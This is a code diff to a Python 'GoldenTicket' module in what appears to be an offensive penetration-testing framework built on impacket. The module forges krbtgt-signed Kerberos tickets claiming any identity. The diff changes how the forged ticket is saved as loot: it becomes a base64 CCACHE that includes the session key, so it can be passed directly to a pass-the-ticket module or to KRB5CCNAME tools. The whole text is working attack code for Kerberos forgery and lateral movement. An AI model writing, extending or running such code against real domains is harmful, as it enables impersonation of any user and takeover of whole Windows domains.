@@ -13,8 +13,9 @@ the domain's KDC accepts your forged TGT. That exchange uses the same
 Heimdal-compatible TGS-REQ kerberoast vendors (Samba's KDC rejects
 impacket's stock request: no authenticator cksum field).
 
-The forged ticket lands in loot as base64 (decode into a .ccache, or
-feed a later pass-the-ticket module).
+The forged ticket lands in loot as base64 CCACHE (ticket + session key —
+the format pass_the_ticket and KRB5CCNAME tools consume; bare AS-REP
+bytes lack the session key and are useless downstream).
 """
 
 import datetime
@@ -37,6 +38,7 @@ try:
     )
     from impacket.krb5 import constants
     from impacket.krb5.asn1 import AS_REP, TGS_REP, EncASRepPart, EncTicketPart
+    from impacket.krb5.ccache import CCache
     from impacket.krb5.crypto import (
         _enctype_table,
         get_kerberos_key_for_enctype,
@@ -433,7 +435,8 @@ class GoldenTicket(AuxiliaryModule):
         Fully offline: builds and krbtgt-signs a PAC claiming the target
         identity, wraps it in a self-issued AS-REP. VALIDATE proves it
         against a KDC by requesting a service ticket with the forged TGT.
-        The ticket lands in loot as base64.
+        The ticket lands in loot as base64 CCACHE (with session key) —
+        feed it to auxiliary/attack/pass_the_ticket.
     """
     authors = ["you"]
     requirements = ["impacket"]
@@ -511,8 +514,14 @@ class GoldenTicket(AuxiliaryModule):
         import base64
         store = getattr(self.framework, "store", None)
         if store is not None:
+            # loot as CCACHE (ticket + session key): bare AS-REP bytes are
+            # useless downstream — consuming a TGT needs its session key.
+            # pass_the_ticket and KRB5CCNAME tools both read this format.
+            ccache = CCache()
+            ccache.fromTGT(tgt, session_key, session_key)
             store.add_loot("ticket", f"golden {target_user} @ {domain}",
-                           base64.b64encode(tgt).decode(), address="")
+                           base64.b64encode(ccache.getData()).decode(),
+                           address="")
 
         if not self.get_option("VALIDATE"):
             return
